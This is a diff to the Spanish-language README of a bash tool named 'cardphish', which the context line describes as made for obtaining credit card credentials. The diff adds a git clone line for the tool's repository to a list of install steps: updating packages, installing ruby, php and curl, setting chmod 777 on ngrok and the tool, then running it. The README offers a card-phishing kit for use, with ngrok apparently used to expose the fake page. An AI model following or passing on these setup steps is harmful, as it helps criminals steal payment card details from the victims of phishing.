@@ -7,6 +7,7 @@ Herramienta hecha en bash ideal para obtener credenciales de una tarjeta de cré
 * `apt update && apt upgrade -y`
 * `apt install ruby git php curl`
 * `gem install lolcat`
+* `git clone https://github.com/wilian-hack/cardphish`
 * `chmod 777 ngrok`
 * `chmod 777 cardphish`
 * `bash cardphish`
